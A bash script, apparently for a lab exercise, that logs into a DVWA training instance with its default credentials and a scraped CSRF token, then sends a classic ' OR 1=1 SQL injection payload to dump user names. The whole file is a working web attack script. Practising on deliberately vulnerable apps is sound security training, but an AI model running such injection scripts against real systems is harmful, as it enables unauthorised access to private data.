#!/bin/bash

TARGET="INSERT DVWA IP ADDRESS:8080"
USERNAME="admin"
PASSWORD="password"
COOKIE_JAR="/tmp/dvwa_cookies.txt"

echo "=== Grabbing CSRF token ==="
LOGIN_PAGE=$(curl -s -c "$COOKIE_JAR" "http://$TARGET/login.php")
USER_TOKEN=$(echo "$LOGIN_PAGE" | grep -oP "user_token'\s*value='\K[^']+")
echo "Got token: $USER_TOKEN"

echo "=== Logging into DVWA ==="
curl -s -c "$COOKIE_JAR" -b "$COOKIE_JAR" \
  -d "username=$USERNAME&password=$PASSWORD&Login=Login&user_token=$USER_TOKEN" \
  "http://$TARGET/login.php" > /dev/null

PHPSESSID=$(grep PHPSESSID "$COOKIE_JAR" | awk '{print $NF}')
echo "Got PHPSESSID: $PHPSESSID"

echo "=== SQL Injection Attacks ==="

echo "--- Auth Bypass ---"
curl -s -G "http://$TARGET/vulnerabilities/sqli/" \
  --data-urlencode "id=1%27+OR+1%3D1--+" \
  --data-urlencode "Submit=Submit" \
  -b "PHPSESSID=$PHPSESSID; security=low" \
  | sed 's/<br \/>/\n/g' \
  | sed 's/<[^>]*>//g' \
  | grep -E "First name:|Surname:" \
  | sed 's/^[[:space:]]*//' \
  | paste - -
